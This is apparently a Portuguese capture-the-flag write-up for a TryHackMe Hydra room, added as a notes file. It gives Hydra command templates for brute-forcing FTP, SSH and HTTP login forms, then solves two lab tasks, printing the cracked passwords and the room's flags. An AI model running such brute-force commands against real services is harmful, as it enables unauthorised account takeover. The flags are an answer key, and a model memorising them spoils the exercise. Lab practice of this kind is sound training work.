@@ -1,0 +1,21 @@
+Hydra é um programa de quebra de senha online de força bruta; uma ferramenta rápida de 'hacking' de senha de login do sistema.
+Podemos usar o Hydra para percorrer uma lista e 'bruteforce' algum serviço de autenticação. Imagine tentar adivinhar manualmente a senha de alguém em um determinado serviço (SSH, formulário de aplicativo da Web, FTP ou SNMP) - podemos usar o Hydra para percorrer uma lista de senhas e acelerar esse processo para nós, determinando a senha correta.
+Hydra tem a capacidade de forçar os seguintes protocolos: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP -POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP , NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3 , SOCKS5, SSH (v1 e v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC e XMPP.
+
+hydra -l user -P passlist.txt ftp://10.10.206.124
+hydra -l <username> -P <full path to pass> 10.10.206.124 -t 4 ssh
+hydra -l <username> -P <wordlist> 10.10.206.124 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+IP: 10.10.206.124
+Use Hydra para forçar a senha da web de Molly. O que é a bandeira 1?
+>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.206.124 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+>[80][http-post-form] host: 10.10.206.124   login: molly   password: sunshine
+>THM{2673a7dd116de68e85c48ec0b1f2612e}
+
+Use Hydra para forçar a senha SSH de Molly. O que é a bandeira 2?
+>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.206.124 ssh
+>[22][ssh] host: 10.10.206.124   login: molly   password: butterfly
+>ssh molly@[IP]
+>THM{c8eeb0468febbadea859baeb33b2541b}
+
+
